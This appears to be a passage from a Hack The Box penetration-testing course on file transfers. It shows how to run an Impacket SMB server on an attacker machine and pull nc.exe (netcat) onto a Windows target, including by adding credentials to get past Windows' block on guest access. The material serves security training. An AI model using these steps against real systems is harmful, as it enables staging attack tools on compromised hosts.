## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

#### Create the SMB Server

Create the SMB Server

```shell-session
glack@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

To download a file from the SMB server to the current working directory, we can use the following command:

#### Copy a File from the SMB Server

Copy a File from the SMB Server

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

Copy a File from the SMB Server

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

#### Create the SMB Server with a Username and Password

Create the SMB Server with a Username and Password

```shell-session
glack@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

#### Mount the SMB Server with Username and Password

Mount the SMB Server with Username and Password

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

**Note:** You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.
